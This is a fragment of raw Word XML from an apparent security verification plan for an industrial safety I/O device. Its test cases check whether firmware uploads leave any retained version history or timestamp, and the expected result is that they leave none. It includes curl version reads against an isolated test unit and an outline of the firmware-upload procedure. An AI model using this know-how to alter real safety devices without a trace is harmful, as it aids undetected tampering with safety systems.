            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097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E7837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 xml:space="preserve">Confirm only the </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>current</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> version is exposed (no historical/previous-version fields) via IoT-Core + I&amp;M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6852F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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>history</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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0468D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Requirements-based verification; NIST SP 800-115 §3.2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F470C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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="56231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F1014" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097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88CDB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t>Sequential-upload history test</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: two successive firmware uploads (v_A → v_B); after each, query for any record of the </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>previous</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">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0933D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t>Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no per-upload history)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D514A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>NIST SP 800-115 §3.2 / §7; OWASP ISTG-FW[UPDT]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484AF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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="7B63F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4AF25" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097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FEB8B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t>Per-upload timestamp test</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: after an upload, check whether any absolute date/time is attached to </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>the version change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C09D1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lastRenderedPageBreak/>
              <w:t>Proves G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (undatable upload — </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>decisive)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153FE" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:lastRenderedPageBreak/>
              <w:t>NIST SP 800-115 §3.2 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>reuse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> TC-RQ003-04 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>method</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097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01289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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="47F35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14191" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097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2D2D04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t>External-record verification</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: assess whether Release Notes provide per-serial, timestamped, tamper-evident, 5-year records for </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>this</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> 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24EE62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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>frames</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>the</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> normative </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>question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A1014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Documentation review (NIST SP 800-115 §3.1); OWASP FSTM Stage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78703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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E500DD2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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary notes:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-erasing install</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (that the upload's own reboot clears incidental records) is proven in </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 (TC-RQ008-02)</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and cross-referenced — TS-2 focuses purely on </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>whether a version-history entry exists</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not on log-clearing mechanics. General retention/capacity → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402F14DE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 xml:space="preserve">Environment binding: uploads on a </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>spare DUT</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (per TC-RQ005-03 constraints, PLC-monitored, isolated Zone-B); version reads via management path. Re-flash a validated image afterward. </w:t>
      </w:r>
      <w:hyperlink r:id="rId332" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId333" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[Security_T...rk_Kali_EN | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="694071D8" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="0D1D0B70">
          <v:rect id="_x0000_i1880" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="685C6C91" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBDF59B" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the sequential-upload history proof (TS-2 → G-1) and the per-upload timestamp proof (TS-3 → G-2). </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve">TS-1/TS-4 follow </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>established</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>templates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E84099B" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="2E4C78C4">
          <v:rect id="_x0000_i1881" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A717865" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ013-02 — Sequential-Upload Version-History Test (G-1 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E24828C" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097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7751"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="557B31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1161E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AA4DE6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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="1D47E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A612B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E9D5D" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>TC-RQ013-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="368C89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9F6C2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C5243" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">RQ-013 (EHSR 1.1.9 §3, SW-version </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>retention</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>) → CR 2.8 / CR 2.9 / CR 3.9 → Asset I, Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="35448B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F8BE2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63823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Repudiation (no retained per-upload version history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="584F9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B3B59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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA409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0998D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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="4A81D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7FCA0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33840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 xml:space="preserve">Demonstrate that the device retains </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no historical, per-upload record</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> of previously uploaded safety-software versions: after uploading version B over version A, no device-resident field reports that version A was ever installed.</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>(The self-erasing install mechanics are cross-referenced to RQ-008; this test targets version-history existence.)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="20939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061524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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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5EF21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1. Record the current version (v_A) and all version fields. 2. Upload version B; after the install, read all version fields. 3. Search for any device-resident record of v_A (previous-version field, upload-history list). 4. Upload a further version C; repeat the search for v_A and v_B.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="6E9B1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292EE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BA021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t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> iff the device retains a queryable, per-upload history including previous versions. </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> only the current version is reported; no record of prior uploads persists → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E2F924F" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097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BA4097" w:rsidRPr="00BA4097" w14:paraId="71CDDB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0CBB71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7F9042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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="24B92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A72BC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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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037CA" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>TC-RQ013-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="21DA9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C6D0A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FF805" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">Spare DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="14428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1BEA8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C18DB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curl (version reads); firmware-update procedure (rotary 999 + reboot + BLOB upload)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56CE799E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># TC-RQ013-02 Two successive uploads; search for retained history of prior versions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1C9424" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId334" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/version</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1302_ver_A.json # v_A (current)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456BF894" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId335" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/deviceinfo/swrevision</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1302_swrev_A.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2C14E3" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t># --- UPLOAD v_B (999 + reboot; BLOB upload; /firmware/install; reboot) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682A4179" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId336" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/version</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1302_ver_B.json # expect: v_B only</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381EA636" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>grep -i "$(jq -r .value TC1302_ver_A.json)" TC1302_ver_B.json TC1302_swrev_A.json &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADB24A3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>|| echo "No device-resident record of previous version v_A" # expect: none</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14192B7A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># --- UPLOAD v_C; repeat search for v_A and v_B ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A5ABE2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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Only the current version reported after each upload; no previous-version field or upload-history list. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ No per-upload history retained (G-1 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1302_ver_A/B.json, history-search output; </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>re-flash log</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to validated image | </w:t>
      </w:r>
      <w:hyperlink r:id="rId337" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...e_RemoteIO | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="02BFB84D" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
